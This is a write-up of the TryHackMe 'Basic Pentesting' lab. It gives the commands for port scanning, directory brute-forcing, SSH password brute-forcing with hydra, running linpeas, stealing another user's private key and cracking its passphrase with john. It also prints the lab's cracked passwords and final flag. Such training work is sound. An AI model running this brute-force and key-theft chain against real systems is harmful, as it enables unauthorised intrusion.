
# Basic Pentesting

Writeup for the tryhackme room Basic Pentesting

### Find the services exposed by the machine

Use nmap tool which comes pre-installed in Kali Linux. Type the command nmap<ip-address> in bash shell

```bash
 sudo nmap 10.10.212.134
```
This will expose all the servies running on the target ip
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%201.PNG?raw=true)

### Find the hidden directory on the web server

use gobuster to bruteforce the directories , gobutser is a great tool for bruteforcing the hidden directories
on a web server

```bash
 gobuster dir -u 10.10.212.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture2.PNG?raw=true)

From the above bruteforcing we can find that the development/ directory is hidden on the web server,investigating
further we can see that there are two files on this hidden directory:\
1.dev.txt:\
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%203.PNG?raw=true)
2.j.txt:\
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%204.PNG?raw=true)

There is an interesting thing discovered in j.txt file,by this we can notice that j and k are the 
intials of users on the web servers.

### Bruteforcing the Username and Password
Using tools such as enum4linux we can enumerate the users on that web server and for any service possible
```bash
 enum4linux -e 10.10.212.134
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%205.PNG?raw=true)
By running the above command we can see that there are two users that have access to the webserver
Jan and Kay!\
By bruteforcing the password of the Jan user by the tool hydra which can be used to bruteforce the
service passwords like SSH,we were able to find out the password:
```bash
 sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.212.134 ssh -I
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%207.PNG?raw=true)

So the answer for the Q5? username- jan | password- armando

Also,by using this username and password we can ssh into the webserver:
```bash
 ssh jan@10.10.212.134
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%208.PNG?raw=true)

So the answer to Q7? SSH

### Enumerate for privilige escalation
We will use a simple script called LinPeas.sh which is a bash script in order to identify vectors
for privilige escalation\
But first we have to download our script into the ssh server using curl:\
```bash
 which curl
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 chmod +x linpeas.sh
```
We have the following information about the web server
![nmap scan](https://miro.medium.com/max/720/1*uq-Jiai8XkCzVvM0wkFWZA.png)\
![nmap scan](https://miro.medium.com/max/720/1*Q69I_ZXBDmNqlQiDEqRX-g.png)

### Final Access
Answer to Q9? Kay\
By looking deep inside the webserver we found that the user Kay has the id_rsa key located in the
directory /home/kay/.ssh through which we can SSH into his user account

![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%209.PNG?raw=true)\
using cat command we can open the file id_rsa
```bash
 ls -la
 cat id_rsa
```
id_rsa file:

![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%2010.PNG?raw=true)\

Just copy paste this file from '----BEGIN RSA PRIVATE KEY'----' till ----END RSA PRIVATE KEY ----'
to local machine name this simply as 'kay_rsa'\

Also we have to change the permissions for the kay_rsa file to work it properly,this can be done simply by
```bash
 nano kay_rsa 
 chmod 600 kay_rsa
```

![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%2017.PNG?raw=true)\
After SSH into the kay user we find that the kay_rsa is passphrase protected,use of simple tool like
ssh2john can convert this passphrase file to john crackable file called pass.txt
```bash
 ssh2john kay_rsa > pass.txt
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%2012.PNG?raw=true)
Now we can easily crack this pass file using johntheripper
```bash
 john pass.txt -wordlist=/usr/share/wordlists/rockyou.txt
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%2013.PNG?raw=true)
the password is 'beeswax'\
Now it's time for the final access into the SSH of Kay user
```bash
 ssh -i kay_rsa kay@10.10.97.62
```
entering the above password will get us in
now opening the pass.bak file will give us the final flag of the challenge
```bash
 ls -al
 cat pass.bak
```
![nmap scan](https://github.com/TM-Deadleaf/TryHackMe_Writeups/blob/main/Capture%2014.PNG?raw=true)

Hence, the final flag and answer to Q11?-heresareallystrongpasswordthatfollowsthepasswordpolicy$$









